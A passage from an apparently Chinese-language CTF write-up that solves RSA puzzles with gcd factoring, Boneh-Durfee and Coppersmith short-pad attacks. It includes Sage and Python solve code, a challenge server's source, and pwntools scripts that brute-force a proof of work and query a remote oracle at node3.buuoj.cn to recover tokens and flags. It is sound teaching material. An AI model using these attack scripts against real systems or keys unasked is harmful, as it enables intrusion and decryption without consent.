class="line"><span class="string">74797173657575640598140788410852016843612519588375968190579734420951374103129570637822547217967978911328419808529204143522454142303138959013220811558490951614314306849367068478190797885056922705403028856734095288522290055309880572321557493798362056216783777593386133347693892941928131945986087712737862263761</span></span><br><span class="line"><span class="string">9209695919437085323423940852135308337887271742988391422139555924185234849146079306139570263602339983687993333013333937719071267190971983543492940032646907167417161479697805991443259327402389097539126399994414628326218438416138199892253597375493026563369334352434282120293396846427418323600336867792587721214</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>好家伙, 连Crypto都开始套娃了, 一共三层RSA, 做了前两层才能知道第三层</p><h2 id="第一层-利用gcd-分解n"><a href="#第一层-利用gcd-分解n" class="headerlink" title="第一层  利用gcd()分解n"></a>第一层  利用<code>gcd()</code>分解<code>n</code></h2><ul><li><code>e</code> : 65537</li><li><code>c</code>: 密文</li><li><code>hint</code>: $hint = d^e (mod \ n)$</li></ul><p>这题不算难, 仔细算一下就能知道这个<code>hint</code>有什么用了<br>首先看一下<code>d = inverse(e,lcm(p,lcm(p-1,q-1)))</code>, $p$都已经是素数了, 公倍数肯定是$kp$</p><p>那么我们就有<br>$$<br>e \cdot d = 1 (mod \ kp)<br>$$<br>把<code>hint</code>的式子和这个式子都改写成:<br>$$<br>e \cdot d  = 1 + k_1p \\<br>d^e = hint + k_2n<br>$$<br>联立一下就有:<br>$$<br>({k_1p+1 \over e})^e  = hint + k_2n \Rightarrow (k_1p+1) = e^e(hint + k_2n) \\<br>\Rightarrow (k_1-e^ek_2q)p = e^e \cdot hint - 1<br>$$<br>取个<code>gcd(e**e * hint - 1,n)</code>, 就可以有<code>p</code>了, 分解<code>n</code>就好做了, 这一层还是挺有意思的</p><h2 id="第二层-Boneh-Durfee-attack"><a href="#第二层-Boneh-Durfee-attack" class="headerlink" title="第二层  Boneh_Durfee attack"></a>第二层  Boneh_Durfee attack</h2><p>这一层的私钥$d \approx 2^{256}$, 而$n \approx 2^{1024}$, 满足使用Boneh_Durfee attack的条件, 直接扔到脚本里跑就能跑出$d$来了<br>有了$d$直接解密即可</p><h2 id="第三层-Coppersmith’s-Short-pad-Attack"><a href="#第三层-Coppersmith’s-Short-pad-Attack" class="headerlink" title="第三层 Coppersmith’s Short-pad Attack"></a>第三层 Coppersmith’s Short-pad Attack</h2><p>第二层出来一个网站<code>https://dawn-whisper.lanzous.com/iCAv0lod7yj-password:gzjq&#39;</code>, 以及密码</p><p>打开后还是一道RSA</p><p>如题, e够小, 直接上脚本就行</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="comment"># 第一层</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">h = <span class="number">788785744509676701442642497798353940704045062680685297430840370664093043099033424646382070232242765761123110381200239132310785932203252095093993313010883982078216697297202940152563278231011836966627537170460186597134847633828107444548759805274516431300662852153808962421740187067058018192457264083227110866080267684557127718769967184710395811547902947248700889674967381917907905535103547918375731341071557144999864774198881339085314424766509424492349867615604684</span></span><br><span class="line">n = <span class="number">1246903000089073759886267722667196003041462505274526737638837808213476294697746018085346623497511017543801377442390781101585650581984057653018703031659844145960721073451379508212905335383758157379301019575213158532070229897587088955814288202279949391608732448294591675986989254272257059551622461096394217684402667140362275595245430242117193793913872208576714597860532581116390903216389172132085635891741189355461016795362341416848534340615825023292174042406128959</span></span><br><span class="line">c = <span class="number">952508462840095293368043281511747192551431448088755251878915582522463097721381421883702408853564036431155676272901680250701398946525803160765527940151587567521509500006089852079864042238196362897144754722623523621230744820970423076092319608853809407595863195726851921082224085255808985329769890887863865121647796115540376158135632760785321953364738008064130705467326745546629505023549047992509562623348749056757848144371814157305011884825502144329268299851210747</span></span><br><span class="line">ee = <span class="built_in">pow</span>(e, e)</span><br><span class="line">p = gcd(ee * h - <span class="number">1</span>, n)</span><br><span class="line">q = n // p ** <span class="number">2</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * p * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e,phi)</span><br><span class="line">e = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">print(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二层</span></span><br><span class="line"><span class="comment"># Boneh_Durfee attack出的结果</span></span><br><span class="line"><span class="comment"># 脚本在https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage</span></span><br><span class="line">d = <span class="number">103079922798932082066165266087442072203677117380612800709240732626110126828541</span></span><br><span class="line">n = <span class="number">97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(<span class="built_in">pow</span>(<span class="number">3</span>,e,n),d,n) == <span class="number">3</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">86143311788363675684674113699193046781796638913243016152555572150858159500527674063754694514501999791875561142925154991000532628799185608465062814546108160434468098898040769021072007374156546314975240583347468026001633652940408779155579339470960571067652924814623371177901052302005289155305089588204204313261</span></span><br><span class="line">print(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三层</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span>(<span class="params">c1, c2, e, n</span>):</span></span><br><span class="line">        PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        g1 = x^e - c1</span><br><span class="line">        g2 = (x+y)^e - c2</span><br><span class="line">        q1 = g1.change_ring(PRZZ)</span><br><span class="line">        q2 = g2.change_ring(PRZZ)</span><br><span class="line">        h = q2.resultant(q1)</span><br><span class="line">        h = h.univariate_polynomial()</span><br><span class="line">        h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">        h = h.monic()</span><br><span class="line">        kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">        diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> diff</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span>(<span class="params">c1, c2, diff, e, n</span>):</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">n = <span class="number">143224951702807798608353389056046982493788310072914995404719898237226283884553121669729599925829562704800197375580487019006702401282671268969358774635337351738915083955659230582177495821699251999928502338923489031347921151957398310960671307216790020399224115377846788378990638367296298663795893865325304226511</span></span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">c1 = <span class="number">74797173657575640598140788410852016843612519588375968190579734420951374103129570637822547217967978911328419808529204143522454142303138959013220811558490951614314306849367068478190797885056922705403028856734095288522290055309880572321557493798362056216783777593386133347693892941928131945986087712737862263761</span></span><br><span class="line">c2 = <span class="number">9209695919437085323423940852135308337887271742988391422139555924185234849146079306139570263602339983687993333013333937719071267190971983543492940032646907167417161479697805991443259327402389097539126399994414628326218438416138199892253597375493026563369334352434282120293396846427418323600336867792587721214</span></span><br><span class="line">diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">long_to_bytes(m1)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># VNCTF&#123;H4ppyNeWy34r!2021_V&amp;N_figHt1ng!&#125;</span></span><br></pre></td></tr></table></figure><h1 id="0x01-strange-function"><a href="#0x01-strange-function" class="headerlink" title="0x01 strange function"></a>0x01 strange function</h1><h2 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">MENU = <span class="string">br&#x27;&#x27;&#x27;[+] 1.function</span></span><br><span class="line"><span class="string">[+] 2.check_answer</span></span><br><span class="line"><span class="string">[+] 3.exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="comment"># 为了缩短篇幅, 这部分没有特别意义的函数就省略了</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">        _hexdigest = sha256(proof.encode()).hexdigest()</span><br><span class="line">        self.send(<span class="string">f&quot;[+] sha256(XXXX+<span class="subst">&#123;proof[<span class="number">4</span>:]&#125;</span>) == <span class="subst">&#123;_hexdigest&#125;</span>&quot;</span>.encode())</span><br><span class="line">        x = self.recv(prompt=<span class="string">b&#x27;[+] Plz tell me XXXX: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:].encode()).hexdigest() != _hexdigest:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">function</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.lenth):</span><br><span class="line">            numerator = <span class="built_in">ord</span>(self.token[i])</span><br><span class="line">            denominator = x - self.data[i]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                tmp = numerator / denominator</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                self.send(<span class="string">b&#x27;[+] Error!&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            res += tmp</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">        self.send(<span class="string">b&#x27;[+] Welcome!&#x27;</span>)</span><br><span class="line">        self.send(<span class="string">b&#x27;[+] Can you find the flag through the calculating?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.score = <span class="number">0</span></span><br><span class="line">        self.token = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">16</span>))</span><br><span class="line">        self.lenth = <span class="built_in">len</span>(self.token)</span><br><span class="line">        self.data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.lenth):</span><br><span class="line">            self.data.append(getRandomInteger(<span class="number">32</span>))</span><br><span class="line">        self.send(<span class="built_in">str</span>(self.data).encode())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.send(MENU, newline=<span class="literal">False</span>)</span><br><span class="line">            choice = self.recv()</span><br><span class="line">            <span class="keyword">if</span>(choice == <span class="string">b&#x27;1&#x27;</span>):</span><br><span class="line">                self.send(<span class="string">b&quot;[+] Plz give me your x: &quot;</span>)</span><br><span class="line">                now = <span class="built_in">int</span>(self.recv().strip().decode())</span><br><span class="line">                now = self.function(now)</span><br><span class="line">                self.send((<span class="string">&quot;[+] let me show you the answer: &quot;</span>+<span class="built_in">str</span>(now)).encode())</span><br><span class="line">            <span class="keyword">elif</span>(choice == <span class="string">b&#x27;2&#x27;</span>):</span><br><span class="line">                guess = self.recv().strip().decode()</span><br><span class="line">                <span class="keyword">if</span>(guess == self.token):</span><br><span class="line">                    self.score += <span class="number">1</span></span><br><span class="line">                    self.send(<span class="string">b&quot;[+] You win!&quot;</span>)</span><br><span class="line">                    self.send((<span class="string">&quot;[!] Now your score: &quot;</span> + <span class="built_in">str</span>(self.score)).encode())</span><br><span class="line"></span><br><span class="line">                    self.token = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.digits + string.ascii_letters) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>((self.score+<span class="number">1</span>)*<span class="number">16</span>)])</span><br><span class="line">                    self.lenth = <span class="built_in">len</span>(self.token)</span><br><span class="line">                    self.data = []</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.lenth):</span><br><span class="line">                        self.data.append(getRandomInteger(<span class="number">32</span>))</span><br><span class="line">                    self.send(<span class="built_in">str</span>(self.data).encode())</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span>(self.score &gt;= <span class="number">5</span>):</span><br><span class="line">                        self.send(flag.encode())</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.send(<span class="string">b&#x27;[+] What do you want to say???&#x27;</span>)</span><br><span class="line">                    self.send(<span class="string">b&#x27;[!] Go away!&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10002</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先理一理这题在干嘛, 要我们干嘛<br>前面常规的工作量证明就不说了</p><p>每次访问服务端的时候, 会从<code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</code>挑出16位作为<code>token</code></p><p>然后将<code>token</code>中的每一位的<code>ascii</code>码都乘一个不同的随机的数(范围在$(0,2^{32})$), 作为<code>data</code>然后发给客户端<br>客户端可以输入一个数$x$让服务端计算:<br>$$<br>token =[t_0,t_1,\cdots,t_n] \\<br>data = [d_0,d_1,\cdots,d_n] \\<br>A = {t_0 \over x - d_0} + {t_1 \over x - d_1} + \cdots + {t_n \over x - d_n}<br>$$<br> 并返回给客户端</p><p>解题的目标就是通过服务端返回的$A$,(可以重复输入不同的$x$获得不同的$A$<br>猜出五轮的$token$(每一轮$token$的位数都会增加</p><p>因为这里的$d_i$范围比较大, 所以每一个$d$都相差比较远, 当$x = d_i + 1$的时候,${t_i \over x - d_i} = t_i$ $|x - d_j| = |d_i + 1 - d_j|(j \ne i)$ 会特别大<br>所以事实上每次输入$x = d_i + 1$的时候, 有<br>$$<br>A_i = {t_0 \over d_i+1-d_0 } + {t_1 \over d_i+1 - d_1} + \cdots + {t_n \over d_i+1 - d_n} \approx {t_i}<br>$$<br>把每次的$A_i$四舍五入之后就是$t_i$了<br>所以每一轮把$x_0,x_1,\cdots,x_n$都发送一次, 就能得到$t_0,t_1,\cdots,t_n$了</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">printable = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof</span>(<span class="params">END, SHA</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> printable:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> printable:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> printable:</span><br><span class="line">                    start = i + j + k + l</span><br><span class="line">                    ensha = sha256((start+END).encode()).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> ensha == SHA:</span><br><span class="line">                        print(start)</span><br><span class="line">                        <span class="keyword">return</span> start</span><br><span class="line"></span><br><span class="line">con = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29406</span>)</span><br><span class="line">resp = con.recvuntil(<span class="string">&#x27;: &#x27;</span>).decode()</span><br><span class="line">END = re.findall(<span class="string">&#x27;XXXX\+(.*)\)&#x27;</span>,resp)[<span class="number">0</span>]</span><br><span class="line">SHA = re.findall(<span class="string">&#x27;== (.*)&#x27;</span>,resp)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">con.send(proof(END,SHA).encode())</span><br><span class="line">resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    token = []</span><br><span class="line">    array = re.findall(<span class="string">r&#x27;\d+&#x27;</span>, resp)</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(i) &gt; <span class="number">1</span>:</span><br><span class="line">            data.append(<span class="built_in">int</span>(i))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        con.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line">        con.sendline(<span class="built_in">str</span>(i + <span class="number">1</span>))</span><br><span class="line">        resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line">        token.append(<span class="built_in">round</span>(<span class="built_in">float</span>(re.findall(<span class="string">r&#x27;let me show you the answer: (.*)&#x27;</span>, resp)[<span class="number">0</span>])))</span><br><span class="line">    print(token)</span><br><span class="line">    presend = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> token:</span><br><span class="line">        presend += <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line">    con.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line"></span><br><span class="line">    con.sendline(presend)</span><br><span class="line">    resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line">    print(resp)</span><br><span class="line"><span class="comment"># flag&#123;66a00c10-773f-4375-8a8e-444f0337bd31&#125;</span></span><br></pre></td></tr></table></figure><h1 id="0x02-strange-function-revenge"><a href="#0x02-strange-function-revenge" class="headerlink" title="0x02 strange_function_revenge"></a>0x02 strange_function_revenge</h1><h2 id="problem-2"><a href="#problem-2" class="headerlink" title="problem"></a>problem</h2><p>跟上一题的区别不大, 就不贴上来了</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>跟第一题的区别就在于随机数的大小变小了, 这样会导致每个$d$的差距不会太大, 再发送$x_i = d_i + 1$, 返回的$A_i$四舍五入就不一定是$t_i$了, 这里的解决办法就是对返回的$A_i$进行一次修正后再四舍五入</p><p>因为$token$是从<code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</code>取的, 这些字符的<code>ascii</code>都是连在一起的, 平均数是<code>86</code>, 每次发送$x_i$的时候, 把除了$t_i$的其他$t$都当作<code>86</code>, 这样就可以计算出:<br>$$<br>offset_i = {86 \over d_i + 1 - d_0}+{86 \over d_i + 1 - d_1}+\cdots+{86 \over d_i + 1 - d_j} (i \ne j)<br>$$<br>这样就可以有!<br>$$<br>A_i - offset_i \approx t_i<br>$$<br>跟strange_function一样发送数据就行了<br>不过这个方法不太稳定, $offset$并不能保证每次都准确的修正$A$, 放一首好运来多跑几次吧<br>(大概跑了七八次吧….</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">printable = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">A = <span class="number">86</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof</span>(<span class="params">END, SHA</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> printable:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> printable:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> printable:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> printable:</span><br><span class="line">                    start = i + j + k + l</span><br><span class="line">                    ensha = sha256((start+END).encode()).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> ensha == SHA:</span><br><span class="line">                        print(start)</span><br><span class="line">                        <span class="keyword">return</span> start</span><br><span class="line"></span><br><span class="line">con = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27609</span>)</span><br><span class="line">resp = con.recvuntil(<span class="string">&#x27;: &#x27;</span>).decode()</span><br><span class="line">END = re.findall(<span class="string">&#x27;XXXX\+(.*)\)&#x27;</span>,resp)[<span class="number">0</span>]</span><br><span class="line">SHA = re.findall(<span class="string">&#x27;== (.*)&#x27;</span>,resp)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">con.send(proof(END,SHA).encode())</span><br><span class="line">resp = con.recvuntil(<span class="string">&#x27;[-] 